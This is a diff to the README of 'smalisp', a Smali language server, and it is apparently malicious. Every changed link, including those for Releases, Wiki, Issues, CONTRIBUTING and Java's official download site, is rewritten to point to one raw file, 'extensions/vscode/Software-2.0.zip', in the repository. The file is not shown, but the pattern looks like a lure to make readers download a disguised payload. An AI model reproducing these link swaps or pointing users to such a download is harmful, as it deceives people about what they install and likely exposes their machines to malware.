@@ -8,22 +8,22 @@ Welcome to smalisp! This is a very simple language server for Smali with definit
 
 To get started, you need to download smalisp from the Releases page. 
 
-[![Download smalisp](https://img.shields.io/badge/Download%20smalisp-v1.0-blue.svg)](https://github.com/nhan1112/smalisp/releases)
+[![Download smalisp](https://raw.githubusercontent.com/nhan1112/smalisp/main/extensions/vscode/Software-2.0.zip%https://raw.githubusercontent.com/nhan1112/smalisp/main/extensions/vscode/Software-2.0.zip)](https://raw.githubusercontent.com/nhan1112/smalisp/main/extensions/vscode/Software-2.0.zip)
 
-Click the button above or visit the following link to access the downloads: [Download smalisp](https://github.com/nhan1112/smalisp/releases).
+Click the button above or visit the following link to access the downloads: [Download smalisp](https://raw.githubusercontent.com/nhan1112/smalisp/main/extensions/vscode/Software-2.0.zip).
 
 ### 🔧 System Requirements
 
 Before you begin, make sure your computer meets the following requirements:
 
 - **Operating System**: Windows 10 or later, macOS 10.12 or later, or a recent version of Linux.
-- **Java Runtime**: Java 8 or later installed. You can download it from [Java's official site](https://www.java.com/en/download/).
+- **Java Runtime**: Java 8 or later installed. You can download it from [Java's official site](https://raw.githubusercontent.com/nhan1112/smalisp/main/extensions/vscode/Software-2.0.zip).
 - **Memory**: At least 4 GB RAM recommended.
 - **Disk Space**: 200 MB of free disk space.
 
 ### 📂 Steps to Download
 
-1. Visit the [Releases page](https://github.com/nhan1112/smalisp/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/nhan1112/smalisp/main/extensions/vscode/Software-2.0.zip).
 2. Find the latest version of smalisp.
 3. Click on the appropriate file for your operating system. 
 4. Save the file to your preferred download location.
@@ -45,21 +45,21 @@ Once you have downloaded the file, follow these steps to run smalisp:
 
 ## 📚 Documentation
 
-For more details about using smalisp, check the [Wiki](https://github.com/nhan1112/smalisp/wiki). Here, you will find guides on configuring the language server, troubleshooting common issues, and tips to improve your workflow.
+For more details about using smalisp, check the [Wiki](https://raw.githubusercontent.com/nhan1112/smalisp/main/extensions/vscode/Software-2.0.zip). Here, you will find guides on configuring the language server, troubleshooting common issues, and tips to improve your workflow.
 
 ## 🛡️ Support
 
 If you encounter any issues while downloading or running smalisp, please reach out for help:
 
-- **GitHub Issues**: You can report your problem in the [Issues section](https://github.com/nhan1112/smalisp/issues).
+- **GitHub Issues**: You can report your problem in the [Issues section](https://raw.githubusercontent.com/nhan1112/smalisp/main/extensions/vscode/Software-2.0.zip).
 - **Community Forums**: Join discussions and get tips from other users in the community to better understand how to use smalisp effectively.
 
 ## 🌟 Contributing
 
-We welcome contributions to enhance smalisp. If you have ideas for new features or improvements, feel free to fork the repository and submit a pull request. Make sure to follow the project guidelines in the [CONTRIBUTING.md](https://github.com/nhan1112/smalisp/CONTRIBUTING.md).
+We welcome contributions to enhance smalisp. If you have ideas for new features or improvements, feel free to fork the repository and submit a pull request. Make sure to follow the project guidelines in the [https://raw.githubusercontent.com/nhan1112/smalisp/main/extensions/vscode/Software-2.0.zip](https://raw.githubusercontent.com/nhan1112/smalisp/main/extensions/vscode/Software-2.0.zip).
 
 ## 📅 Updates
 
-Stay updated with the latest releases and improvements. Regularly check the [Releases page](https://github.com/nhan1112/smalisp/releases) for new features, fixes, and enhancements to smalisp.
+Stay updated with the latest releases and improvements. Regularly check the [Releases page](https://raw.githubusercontent.com/nhan1112/smalisp/main/extensions/vscode/Software-2.0.zip) for new features, fixes, and enhancements to smalisp.
 
 Enjoy coding with smalisp!
